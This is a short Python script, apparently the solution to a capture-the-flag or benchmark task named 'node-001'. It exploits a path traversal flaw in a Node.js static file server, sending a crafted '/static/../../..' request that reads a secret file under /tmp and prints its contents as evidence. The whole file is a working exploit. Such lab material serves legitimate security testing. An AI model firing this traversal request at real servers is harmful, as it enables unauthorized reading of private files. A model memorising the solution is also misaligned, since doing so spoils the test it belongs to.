#!/usr/bin/env python3
"""Read the private file through the Node.js static path traversal."""

import http.client
import json
import os
import urllib.parse


FLAG_PATH = "/tmp/node-001-secret"


def read_file(target_url: str) -> tuple[int, str]:
    parsed = urllib.parse.urlsplit(target_url)
    if parsed.scheme != "http" or not parsed.hostname:
        raise ValueError("Expected an HTTP target URL")
    port = parsed.port or 80
    connection = http.client.HTTPConnection(parsed.hostname, port, timeout=20)
    path = "/static/../../../a/../../../../tmp/node-001-secret"
    connection.request("GET", path)
    response = connection.getresponse()
    content = response.read().decode("utf-8")
    status = response.status
    connection.close()
    return status, content


def main() -> None:
    target_url = os.environ.get("REMOTE_TARGET_URL") or os.environ["LOCAL_TARGET_URL"]
    status, content = read_file(target_url)
    if status != 200:
        raise RuntimeError(f"File request returned HTTP {status}")
    print(json.dumps({
        "evidence_payload": {"flag_path": FLAG_PATH, "content": content},
        "request_status": status,
    }))


if __name__ == "__main__":
    main()
